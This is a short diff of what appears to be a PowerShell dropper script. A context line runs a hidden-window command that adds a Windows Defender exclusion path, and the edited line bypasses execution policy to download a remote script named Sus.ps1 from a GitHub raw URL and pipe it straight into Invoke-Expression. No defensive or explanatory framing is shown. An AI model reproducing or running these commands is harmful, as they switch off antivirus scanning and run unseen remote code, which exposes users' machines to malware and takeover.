@@ -9,4 +9,4 @@ powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Win
 
 Start-Sleep -Seconds 2
 
-powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm "https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/Sus.ps1" | iex' -Verb RunAs"
+powershell.exe -ExecutionPolicy Bypass -Command "irm \"https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/Sus.ps1\" | iex"
